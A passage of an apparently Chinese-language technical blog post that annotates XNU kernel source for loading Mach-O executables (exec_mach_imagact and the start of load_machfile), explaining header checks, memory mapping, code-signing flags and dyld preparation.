class="line">	int			vfexec = (imgp-&gt;ip_flags &amp; IMGPF_VFORK_EXEC);</span><br><span class="line">	int			p_name_len;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * make sure it's a Mach-O 1.0 or Mach-O 2.0 binary; the difference</span><br><span class="line">	 * is a reserved field on the end, so for the most part, we can</span><br><span class="line">	 * treat them as if they were identical. Reverse-endian Mach-O</span><br><span class="line">	 * binaries are recognized but not compatible.</span><br><span class="line"> 	 */</span><br><span class="line">    // 检测header里面的magic，是否符合macho文件的特征</span><br><span class="line">  	// NXSwapInt:PowerPC等平台中的二进制文件</span><br><span class="line">  	//MH_CIGAM    = 0xCEFAEDFE</span><br><span class="line">    //MH_CIGAM_64 = 0xCFFAEDFE</span><br><span class="line">	if ((mach_header-&gt;magic == MH_CIGAM) ||</span><br><span class="line">	    (mach_header-&gt;magic == MH_CIGAM_64)) &#123;</span><br><span class="line">		error = EBADARCH;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  	// 检测header里面的magic，是否符合macho文件的特征</span><br><span class="line">    // #define	MH_MAGIC	0xfeedface</span><br><span class="line">  	// #define MH_MAGIC_64 0xfeedfacf </span><br><span class="line">    // 通用的macho二进制文件，一般遇到都是这种</span><br><span class="line">	if ((mach_header-&gt;magic != MH_MAGIC) &amp;&amp;</span><br><span class="line">	    (mach_header-&gt;magic != MH_MAGIC_64)) &#123;</span><br><span class="line">		error = -1;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">  	// 检测macho的文件类型，文件类型必须是可执行文件</span><br><span class="line">   	// 还有一些其他的常见类型</span><br><span class="line">    // #define	MH_OBJECT	0x1		编译过程产生的obj文件</span><br><span class="line">    // #define	MH_CORE		0x4		崩溃时的dump文件</span><br><span class="line">	if (mach_header-&gt;filetype != MH_EXECUTE) &#123;</span><br><span class="line">		error = -1;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    // 获取macho的执行环境，cpu的平台与版本</span><br><span class="line">	if (imgp-&gt;ip_origcputype != 0) &#123;</span><br><span class="line">		/* Fat header previously had an idea about this thin file */</span><br><span class="line">		if (imgp-&gt;ip_origcputype != mach_header-&gt;cputype ||</span><br><span class="line">			imgp-&gt;ip_origcpusubtype != mach_header-&gt;cpusubtype) &#123;</span><br><span class="line">			error = EBADARCH;</span><br><span class="line">			goto bad;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		imgp-&gt;ip_origcputype = mach_header-&gt;cputype;</span><br><span class="line">		imgp-&gt;ip_origcpusubtype = mach_header-&gt;cpusubtype;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	task = current_task();</span><br><span class="line">	thread = current_thread();</span><br><span class="line">	uthread = get_bsdthread_info(thread);</span><br><span class="line"></span><br><span class="line">	if ((mach_header-&gt;cputype &amp; CPU_ARCH_ABI64) == CPU_ARCH_ABI64)</span><br><span class="line">		imgp-&gt;ip_flags |= IMGPF_IS_64BIT;</span><br><span class="line"></span><br><span class="line">	/* If posix_spawn binprefs exist, respect those prefs. */</span><br><span class="line">	psa = (struct _posix_spawnattr *) imgp-&gt;ip_px_sa;</span><br><span class="line">	if (psa != NULL &amp;&amp; psa-&gt;psa_binprefs[0] != 0) &#123;</span><br><span class="line">		int pr = 0;</span><br><span class="line">		for (pr = 0; pr &lt; NBINPREFS; pr++) &#123;</span><br><span class="line">			cpu_type_t pref = psa-&gt;psa_binprefs[pr];</span><br><span class="line">			if (pref == 0) &#123;</span><br><span class="line">				/* No suitable arch in the pref list */</span><br><span class="line">				error = EBADARCH;</span><br><span class="line">				goto bad;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			if (pref == CPU_TYPE_ANY) &#123;</span><br><span class="line">				/* Jump to regular grading */</span><br><span class="line">				goto grade;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			if (pref == imgp-&gt;ip_origcputype) &#123;</span><br><span class="line">				/* We have a match! */</span><br><span class="line">				goto grade;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		error = EBADARCH;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line">grade:</span><br><span class="line">  	//检测cpu平台</span><br><span class="line">	if (!grade_binary(imgp-&gt;ip_origcputype, imgp-&gt;ip_origcpusubtype &amp; ~CPU_SUBTYPE_MASK)) 	  &#123;</span><br><span class="line">		error = EBADARCH;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* Copy in arguments/environment from the old process */</span><br><span class="line">    //获取环境变量和参数</span><br><span class="line">    //为vfork执行macho做准备</span><br><span class="line">	error = exec_extract_strings(imgp);</span><br><span class="line">	if (error)</span><br><span class="line">		goto bad;</span><br><span class="line"></span><br><span class="line">	error = exec_add_apple_strings(imgp);</span><br><span class="line">	if (error)</span><br><span class="line">		goto bad;</span><br><span class="line"></span><br><span class="line">	AUDIT_ARG(argv, imgp-&gt;ip_startargv, imgp-&gt;ip_argc, </span><br><span class="line">	    imgp-&gt;ip_endargv - imgp-&gt;ip_startargv);</span><br><span class="line">	AUDIT_ARG(envv, imgp-&gt;ip_endargv, imgp-&gt;ip_envc,</span><br><span class="line">	    imgp-&gt;ip_endenvv - imgp-&gt;ip_endargv);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * We are being called to activate an image subsequent to a vfork()</span><br><span class="line">	 * operation; in this case, we know that our task, thread, and</span><br><span class="line">	 * uthread are actually those of our parent, and our proc, which we</span><br><span class="line">	 * obtained indirectly from the image_params vfs_context_t, is the</span><br><span class="line">	 * new child process.</span><br><span class="line">	 */</span><br><span class="line">    // 通过fork，为macho生成一个新的线程</span><br><span class="line">	if (vfexec || spawn) &#123;</span><br><span class="line">		if (vfexec) &#123;</span><br><span class="line">			imgp-&gt;ip_new_thread = fork_create_child(task, NULL, p, FALSE, (imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT));</span><br><span class="line">			if (imgp-&gt;ip_new_thread == NULL) &#123;</span><br><span class="line">				error = ENOMEM;</span><br><span class="line">				goto bad;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		/* reset local idea of thread, uthread, task */</span><br><span class="line">		thread = imgp-&gt;ip_new_thread;</span><br><span class="line">		uthread = get_bsdthread_info(thread);</span><br><span class="line">		task = new_task = get_threadtask(thread);</span><br><span class="line">		map = get_task_map(task);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		map = VM_MAP_NULL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * We set these flags here; this is OK, since if we fail after</span><br><span class="line">	 * this point, we have already destroyed the parent process anyway.</span><br><span class="line">	 */</span><br><span class="line">    // 设置一些dyld需要使用的参数</span><br><span class="line">	task_set_dyld_info(task, MACH_VM_MIN_ADDRESS, 0);</span><br><span class="line">	if (imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) &#123;</span><br><span class="line">		task_set_64bit(task, TRUE);</span><br><span class="line">		OSBitOrAtomic(P_LP64, &amp;p-&gt;p_flag);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		task_set_64bit(task, FALSE);</span><br><span class="line">		OSBitAndAtomic(~((uint32_t)P_LP64), &amp;p-&gt;p_flag);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 *	Load the Mach-O file.</span><br><span class="line">	 *</span><br><span class="line">	 * NOTE: An error after this point  indicates we have potentially</span><br><span class="line">	 * destroyed or overwritten some process state while attempting an</span><br><span class="line">	 * execve() following a vfork(), which is an unrecoverable condition.</span><br><span class="line">	 * We send the new process an immediate SIGKILL to avoid it executing</span><br><span class="line">	 * any instructions in the mutated address space. For true spawns,</span><br><span class="line">	 * this is not the case, and "too late" is still not too late to</span><br><span class="line">	 * return an error code to the parent process.</span><br><span class="line">	 */</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Actually load the image file we previously decided to load.</span><br><span class="line">	 */</span><br><span class="line">    //加载，映射macho文件到内存</span><br><span class="line">	lret = load_machfile(imgp, mach_header, thread, map, &amp;load_result);</span><br><span class="line"></span><br><span class="line">	if (lret != LOAD_SUCCESS) &#123;</span><br><span class="line">		error = load_return_to_errno(lret);</span><br><span class="line">		goto badtoolate;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	proc_lock(p);</span><br><span class="line">	p-&gt;p_cputype = imgp-&gt;ip_origcputype;</span><br><span class="line">	p-&gt;p_cpusubtype = imgp-&gt;ip_origcpusubtype;</span><br><span class="line">	proc_unlock(p);</span><br><span class="line"></span><br><span class="line">	vm_map_set_user_wire_limit(get_task_map(task), p-&gt;p_rlimit[RLIMIT_MEMLOCK].rlim_cur);</span><br><span class="line"></span><br><span class="line">	/* </span><br><span class="line">	 * Set code-signing flags if this binary is signed, or if parent has</span><br><span class="line">	 * requested them on exec.</span><br><span class="line">	 */</span><br><span class="line">  	//设置了一堆标记位</span><br><span class="line">    //需要关心一下的是这里和code-signgin有点关系</span><br><span class="line">	if (load_result.csflags &amp; CS_VALID) &#123;</span><br><span class="line">		imgp-&gt;ip_csflags |= load_result.csflags &amp; </span><br><span class="line">			(CS_VALID|</span><br><span class="line">			 CS_HARD|CS_KILL|CS_RESTRICT|CS_ENFORCEMENT|CS_REQUIRE_LV|CS_DYLD_PLATFORM|</span><br><span class="line">			 CS_EXEC_SET_HARD|CS_EXEC_SET_KILL|CS_EXEC_SET_ENFORCEMENT);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		imgp-&gt;ip_csflags &amp;= ~CS_VALID;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_HARD)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_HARD;</span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_KILL)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_KILL;</span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_ENFORCEMENT)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_ENFORCEMENT;</span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_INSTALLER)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_INSTALLER;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Set up the system reserved areas in the new address space.</span><br><span class="line">	 */</span><br><span class="line">    //依据可执行文件的平台，设置合适的执行环境</span><br><span class="line">	vm_map_exec(get_task_map(task),</span><br><span class="line">		    task,</span><br><span class="line">		    (void *) p-&gt;p_fd-&gt;fd_rdir,</span><br><span class="line">		    cpu_type());</span><br><span class="line">	</span><br><span class="line">	/*</span><br><span class="line">	 * Close file descriptors which specify close-on-exec.</span><br><span class="line">	 */</span><br><span class="line">    //关闭所有被标记为close-on-exec的文件</span><br><span class="line">	fdexec(p, psa != NULL ? psa-&gt;psa_flags : 0);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * deal with set[ug]id.</span><br><span class="line">	 */</span><br><span class="line">  	//处理setuid相关的逻辑，和权限相关</span><br><span class="line">	error = exec_handle_sugid(imgp);</span><br><span class="line">	if (error) &#123;</span><br><span class="line">		goto badtoolate;</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * deal with voucher on exec-calling thread.</span><br><span class="line">	 */</span><br><span class="line">	if (imgp-&gt;ip_new_thread == NULL)</span><br><span class="line">		thread_set_mach_voucher(current_thread(), IPC_VOUCHER_NULL);</span><br><span class="line"></span><br><span class="line">	/* Make sure we won't interrupt ourself signalling a partial process */</span><br><span class="line">	if (!vfexec &amp;&amp; !spawn &amp;&amp; (p-&gt;p_lflag &amp; P_LTRACED))</span><br><span class="line">		psignal(p, SIGTRAP);</span><br><span class="line">	</span><br><span class="line">  	//为进程设置应用层的栈地址</span><br><span class="line">	if (load_result.unixproc &amp;&amp;</span><br><span class="line">		create_unix_stack(get_task_map(task),</span><br><span class="line">				  &amp;load_result,</span><br><span class="line">				  p) != KERN_SUCCESS) &#123;</span><br><span class="line">		error = load_return_to_errno(LOAD_NOSPACE);</span><br><span class="line">		goto badtoolate;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (vfexec || spawn) &#123;</span><br><span class="line">		old_map = vm_map_switch(get_task_map(task));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (load_result.unixproc) &#123;</span><br><span class="line">		user_addr_t	ap;</span><br><span class="line"></span><br><span class="line">		/*</span><br><span class="line">		 * Copy the strings area out into the new process address</span><br><span class="line">		 * space.</span><br><span class="line">		 */</span><br><span class="line">		ap = p-&gt;user_stack;</span><br><span class="line">		error = exec_copyout_strings(imgp, &amp;ap);</span><br><span class="line">		if (error) &#123;</span><br><span class="line">			if (vfexec || spawn)</span><br><span class="line">				vm_map_switch(old_map);</span><br><span class="line">			goto badtoolate;</span><br><span class="line">		&#125;</span><br><span class="line">		/* Set the stack */</span><br><span class="line">		thread_setuserstack(thread, ap);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	if (load_result.dynlinker) &#123;</span><br><span class="line">		uint64_t	ap;</span><br><span class="line">		int			new_ptr_size = (imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) ? 8 : 4;</span><br><span class="line"></span><br><span class="line">		/* Adjust the stack */</span><br><span class="line">		ap = thread_adjuserstack(thread, -new_ptr_size);</span><br><span class="line">		error = copyoutptr(load_result.mach_header, ap, new_ptr_size);</span><br><span class="line"></span><br><span class="line">		if (error) &#123;</span><br><span class="line">			if (vfexec || spawn)</span><br><span class="line">				vm_map_switch(old_map);</span><br><span class="line">			goto badtoolate;</span><br><span class="line">		&#125;</span><br><span class="line">		task_set_dyld_info(task, load_result.all_image_info_addr,</span><br><span class="line">		    load_result.all_image_info_size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* Avoid immediate VM faults back into kernel */</span><br><span class="line">  	//防止立刻执行指令导致的错误，做了大量和dyld相关的事情</span><br><span class="line">	exec_prefault_data(p, imgp, &amp;load_result);</span><br><span class="line"></span><br><span class="line">	if (vfexec || spawn) &#123;</span><br><span class="line">		vm_map_switch(old_map);</span><br><span class="line">	&#125;</span><br><span class="line">	/* Set the entry point */</span><br><span class="line">	thread_setentrypoint(thread, load_result.entry_point);</span><br><span class="line"></span><br><span class="line">	/* Stop profiling */</span><br><span class="line">	stopprofclock(p);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Reset signal state.</span><br><span class="line">	 */</span><br><span class="line">	execsigs(p, thread);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * need to cancel async IO requests that can be cancelled and wait for those</span><br><span class="line">	 * already active.  MAY BLOCK!</span><br><span class="line">	 */</span><br><span class="line">	_aio_exec( p );</span><br><span class="line"></span><br><span class="line">#if SYSV_SHM</span><br><span class="line">	/* FIXME: Till vmspace inherit is fixed: */</span><br><span class="line">	if (!vfexec &amp;&amp; p-&gt;vm_shm)</span><br><span class="line">		shmexec(p);</span><br><span class="line">#endif</span><br><span class="line">#if SYSV_SEM</span><br><span class="line">	/* Clean up the semaphores */</span><br><span class="line">	semexit(p);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Remember file name for accounting.</span><br><span class="line">	 */</span><br><span class="line">	p-&gt;p_acflag &amp;= ~AFORK;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Set p-&gt;p_comm and p-&gt;p_name to the name passed to exec</span><br><span class="line">	 */</span><br><span class="line">	p_name_len = sizeof(p-&gt;p_name) - 1;</span><br><span class="line">	if(imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen &gt; p_name_len)</span><br><span class="line">		imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen = p_name_len;</span><br><span class="line">	bcopy((caddr_t)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_nameptr, (caddr_t)p-&gt;p_name,</span><br><span class="line">		(unsigned)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen);</span><br><span class="line">	p-&gt;p_name[imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen] = '\0';</span><br><span class="line"></span><br><span class="line">	if (imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen &gt; MAXCOMLEN)</span><br><span class="line">		imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen = MAXCOMLEN;</span><br><span class="line">	bcopy((caddr_t)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_nameptr, (caddr_t)p-&gt;p_comm,</span><br><span class="line">		(unsigned)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen);</span><br><span class="line">	p-&gt;p_comm[imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen] = '\0';</span><br><span class="line"></span><br><span class="line">	pal_dbg_set_task_name( p-&gt;task );</span><br><span class="line"></span><br><span class="line">#if DEVELOPMENT || DEBUG</span><br><span class="line">	/* </span><br><span class="line">	 * Update the pid an proc name for importance base if any</span><br><span class="line">	 */</span><br><span class="line">	task_importance_update_owner_info(p-&gt;task);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	memcpy(&amp;p-&gt;p_uuid[0], &amp;load_result.uuid[0], sizeof(p-&gt;p_uuid));</span><br><span class="line"></span><br><span class="line">// &lt;rdar://6598155&gt; dtrace code cleanup needed</span><br><span class="line">#if CONFIG_DTRACE</span><br><span class="line">	/*</span><br><span class="line">	 * Invalidate any predicate evaluation already cached for this thread by DTrace.</span><br><span class="line">	 * That's because we've just stored to p_comm and DTrace refers to that when it</span><br><span class="line">	 * evaluates the "execname" special variable. uid and gid may have changed as well.</span><br><span class="line">	 */</span><br><span class="line">	dtrace_set_thread_predcache(current_thread(), 0);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Free any outstanding lazy dof entries. It is imperative we</span><br><span class="line">	 * always call dtrace_lazy_dofs_destroy, rather than null check</span><br><span class="line">	 * and call if !NULL. If we NULL test, during lazy dof faulting</span><br><span class="line">	 * we can race with the faulting code and proceed from here to</span><br><span class="line">	 * beyond the helpers cleanup. The lazy dof faulting will then</span><br><span class="line">	 * install new helpers which no longer belong to this process!</span><br><span class="line">	 */</span><br><span class="line">	dtrace_lazy_dofs_destroy(p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">    	 * Clean up any DTrace helpers for the process.</span><br><span class="line">    	 */</span><br><span class="line">    	if (p-&gt;p_dtrace_helpers != NULL &amp;&amp; dtrace_helpers_cleanup) &#123;</span><br><span class="line">    		(*dtrace_helpers_cleanup)(p);</span><br><span class="line">    	&#125;</span><br><span class="line">	</span><br><span class="line">    	/*</span><br><span class="line">    	 * Cleanup the DTrace provider associated with this process.</span><br><span class="line">    	 */</span><br><span class="line">	proc_lock(p);</span><br><span class="line">	if (p-&gt;p_dtrace_probes &amp;&amp; dtrace_fasttrap_exec_ptr) &#123;</span><br><span class="line">		(*dtrace_fasttrap_exec_ptr)(p);</span><br><span class="line">	&#125;</span><br><span class="line">	proc_unlock(p);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	if (kdebug_enable) &#123;</span><br><span class="line">		long dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4;</span><br><span class="line"></span><br><span class="line">		/*</span><br><span class="line">		 * Collect the pathname for tracing</span><br><span class="line">		 */</span><br><span class="line">		kdbg_trace_string(p, &amp;dbg_arg1, &amp;dbg_arg2, &amp;dbg_arg3, &amp;dbg_arg4);</span><br><span class="line"></span><br><span class="line">		if (vfexec || spawn) &#123;</span><br><span class="line">			KERNEL_DEBUG_CONSTANT1(TRACE_DATA_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					p-&gt;p_pid ,0,0,0, (uintptr_t)thread_tid(thread));</span><br><span class="line">			KERNEL_DEBUG_CONSTANT1(TRACE_STRING_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4, (uintptr_t)thread_tid(thread));</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			KERNEL_DEBUG_CONSTANT(TRACE_DATA_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					p-&gt;p_pid ,0,0,0,0);</span><br><span class="line">			KERNEL_DEBUG_CONSTANT(TRACE_STRING_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4, 0);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * If posix_spawned with the START_SUSPENDED flag, stop the</span><br><span class="line">	 * process before it runs.</span><br><span class="line">	 */</span><br><span class="line">	if (imgp-&gt;ip_px_sa != NULL) &#123;</span><br><span class="line">		psa = (struct _posix_spawnattr *) imgp-&gt;ip_px_sa;</span><br><span class="line">		if (psa-&gt;psa_flags &amp; POSIX_SPAWN_START_SUSPENDED) &#123;</span><br><span class="line">			proc_lock(p);</span><br><span class="line">			p-&gt;p_stat = SSTOP;</span><br><span class="line">			proc_unlock(p);</span><br><span class="line">			(void) task_suspend_internal(p-&gt;task);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * mark as execed, wakeup the process that vforked (if any) and tell</span><br><span class="line">	 * it that it now has its own resources back</span><br><span class="line">	 */</span><br><span class="line">	OSBitOrAtomic(P_EXEC, &amp;p-&gt;p_flag);</span><br><span class="line">	proc_resetregister(p);</span><br><span class="line">	if (p-&gt;p_pptr &amp;&amp; (p-&gt;p_lflag &amp; P_LPPWAIT)) &#123;</span><br><span class="line">		proc_lock(p);</span><br><span class="line">		p-&gt;p_lflag &amp;= ~P_LPPWAIT;</span><br><span class="line">		proc_unlock(p);</span><br><span class="line">		wakeup((caddr_t)p-&gt;p_pptr);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Pay for our earlier safety; deliver the delayed signals from</span><br><span class="line">	 * the incomplete vfexec process now that it's complete.</span><br><span class="line">	 */</span><br><span class="line">	if (vfexec &amp;&amp; (p-&gt;p_lflag &amp; P_LTRACED)) &#123;</span><br><span class="line">		psignal_vfork(p, new_task, thread, SIGTRAP);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	goto done;</span><br><span class="line"></span><br><span class="line">badtoolate:</span><br><span class="line">	/* Don't allow child process to execute any instructions */</span><br><span class="line">	if (!spawn) &#123;</span><br><span class="line">		if (vfexec) &#123;</span><br><span class="line">			psignal_vfork(p, new_task, thread, SIGKILL);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			psignal(p, SIGKILL);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		/* We can't stop this system call at this point, so just pretend we succeeded */</span><br><span class="line">		error = 0;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">done:</span><br><span class="line">	if (!spawn) &#123;</span><br><span class="line">		/* notify only if it has not failed due to FP Key error */</span><br><span class="line">		if ((p-&gt;p_lflag &amp; P_LTERM_DECRYPTFAIL) == 0)</span><br><span class="line">			proc_knote(p, NOTE_EXEC);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* Drop extra references for cases where we don't expect the caller to clean up */</span><br><span class="line">	if (vfexec || (spawn &amp;&amp; error == 0)) &#123;</span><br><span class="line">		task_deallocate(new_task);</span><br><span class="line">		thread_deallocate(thread);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line">	return(error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数主要做这几件事情：</p>
<ul>
<li>对macho文件做最基本的检测</li>
<li><code>fork</code>新的线程运行macho</li>
<li>映射macho文件到内存中</li>
<li>对setuid，code-sign等权限相关的事情有处理</li>
<li>为dyld接手macho文件的处理做了大量的准备工作</li>
<li>dyld处理完之后，对资源的释放</li>
</ul>
<h2 id="1-4_load_machfile">1.4 load_machfile</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load_return_t</span></span><br><span class="line">load_machfile(</span><br><span class="line">	<span class="keyword">struct</span> image_params	*imgp,</span><br><span class="line">	<span class="keyword">struct</span> mach_header	*header,</span><br><span class="line">	<span class="keyword">thread_t</span> 		thread,</span><br><span class="line">	<span class="keyword">vm_map_t</span> 		new_map,</span><br><span class="line">	<span class="keyword">load_result_t</span>		*result</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">struct</span> vnode		*vp = imgp-&gt;ip_vp;</span><br><span class="line">	<span class="keyword">off_t</span>			file_offset = imgp-&gt;ip_arch_offset;</span><br><span class="line">	<span class="keyword">off_t</span>			macho_size = imgp-&gt;ip_arch_size;</span><br><span class="line">	<span class="keyword">off_t</span>			file_size = imgp-&gt;ip_vattr-&gt;va_data_size;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">pmap_t</span>			pmap = <span class="number">0</span>;	<span class="comment">/* protected by 